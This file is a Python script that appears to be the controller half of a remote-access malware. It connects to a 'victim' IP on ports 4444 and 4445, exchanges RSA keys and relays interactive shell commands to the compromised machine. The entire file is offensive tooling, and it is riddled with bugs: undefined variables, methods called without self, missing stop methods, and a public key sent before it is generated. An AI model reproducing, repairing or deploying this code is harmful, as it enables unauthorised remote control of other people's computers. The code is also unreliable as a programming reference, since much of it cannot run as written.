import threading
import time
import socket
import sys

from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.serialization import load_pem_public_key

remote_public_key = None
public_key_pem = None
private_key = None

IN_PORT = 4444
OUT_PORT = 4445


def print_help():
    print('Couldn\'t load program with arguments', ' '.join(sys.argv))
    print('Usage : python3 <program_name> <victim_IP_address>')


class InThread(threading.Thread):
    def __init__(self, ip, in_port=IN_PORT):
        super().__init__()
        self.in_port = in_port
        self.ip = ip

        try:
            self.socket = socket.socket()
            self.socket.bind(('', self.in_port))
            self.socket.listen(1)

            self.conn, self.in_ip = self.socket.accept()
            print('Connection received from {} on port {}'.format(self.in_ip[0], self.in_ip[1]))
            self.init_public_key()
        except timeout:
            print('No response from {}'.format(self.ip))

    def run(self):
        again = True
        while again:
            msg = self.conn.recv(1024).decode('UTF-8')
            if msg == 'exit':
                again = False
            else:
                print(msg)

        self.socket.close()
        print('Closed socket coming from {}'.format(self.in_addr))

    def init_public_key(self):
        try:
            remote_public_key_pem = connection.recv(InThread.BUFFER_SIZE)
            global remote_public_key
            remote_public_key = load_pem_public_key(remote_public_key_pem, backend=default_backend())
            print("Remote public key successfully loaded")
        except timeout:
            self.init_public_key()
        except ValueError:
            print("Invalid Public Key received")

    # Used to be called decrypt
    def rsa_decrypt(self,ciphertext):
        global private_key
        return private_key.decrypt(ciphertext,
                                padding.OAEP(
                                    mgf=padding.MGF1(algorithm=hashes.SHA256()),
                                    algorithm=hashes.SHA256(),
                                    label=None))


class OutThread(threading.Thread):
    def __init__(self, ip, out_port: int):
        super().__init__()
        self.ip = ip
        self.out_port = out_port

        try:
            self.sock = socket.socket()
            self.sock.connect((self.ip, self.out_port))
        except ConnectionError:
            print('Unable to connect to {}'.format(self.ip))

        self.send_public_keys()

    def run(self):
        again = True
        while again:
            msg = input('{} > '.format(self.ip))
            if msg == '':
                pass
            elif msg == 'exit':
                again = False
                send(msg)
            elif msg == 'shell':
                keepalive = True
                while keepalive:
                    shell = input('{} > shell > '.format(self.ip))
                    if shell == '':
                        pass
                    elif shell == 'exit':
                        keepalive = False
                    else:
                        send(shell)
            elif msg == 'info':
                send(msg)


        s.close()
        print('Terminated connection to {}'.format(self.ip))

    def send(self, message):
        try:
            self.sock.sendall(message.encode('UTF-8'))
        except ConnectionError:
            print('Unable to send <<{}>> to {}'.format(message, self.ip))

    def send_public_keys(self):
        try:
            global public_key_pem
            self.sock.sendall(public_key_pem)
        except ConnectionError:
            print("Unable to connect to {}:{}".format(self.destination[0], self.destination[1]))
            self.send_public_keys()

    # Method used to be called encrypt
    def rsa_encrypt(self, message):
        global remote_public_key
        return remote_public_key.encrypt(message,
                                         padding.OAEP(
                                             mgf=padding.MGF1(algorithm=hashes.SHA256()),
                                             algorithm=hashes.SHA256(),
                                             label=None))


class Malware():
    def __init__(self, ip, out_port=OUT_PORT, in_port=IN_PORT):
        self.ip = ip
        self.out_port = out_port
        self.in_port = in_port

        print("Trying to reach {} on port {}".format(self.ip, self.out_port))
        self.prod = InThread(self.in_port)
        self.cons = OutThread(self.ip, self.out_port)

        global private_key
        global public_key_pem
        private_key = self.generate_rsa_keys()
        public_key_pem = self.serialize_public_key(private_key.public_key())

    def run(self):
        self.prod.start()
        self.cons.start()
        if self.cons.is_alive():
            self.cons.join()
        if self.prod.is_alive():
            self.prod.join()

        self.stop()

    def stop(self):
        self.prod.stop()
        self.cons.stop()

    def generate_rsa_keys(self):
        return rsa.generate_private_key(backend=default_backend(),
                                               public_exponent=65537,
                                               key_size=2048)

    def serialize_public_key(self,public_key):
        return public_key.public_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PublicFormat.SubjectPublicKeyInfo)


if len(sys.argv) == 2:
    ip = sys.argv[1]
    malw = Malware(ip)
else:
    print_help()
